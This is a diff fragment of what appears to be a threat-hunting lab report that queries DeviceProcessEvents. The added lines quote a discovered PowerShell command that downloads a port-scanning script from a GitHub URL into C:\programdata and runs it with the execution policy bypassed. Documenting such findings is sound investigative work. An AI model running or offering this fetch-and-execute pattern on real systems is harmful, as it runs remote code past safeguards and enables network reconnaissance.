@@ -112,6 +112,11 @@ DeviceProcessEvents
 Key Finding:
 A PowerShell command was executed at 2025-06-10T08:37:51Z with the following line:
 
+```powershell
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
+
+```
+
 powershell
 Copy
 Edit
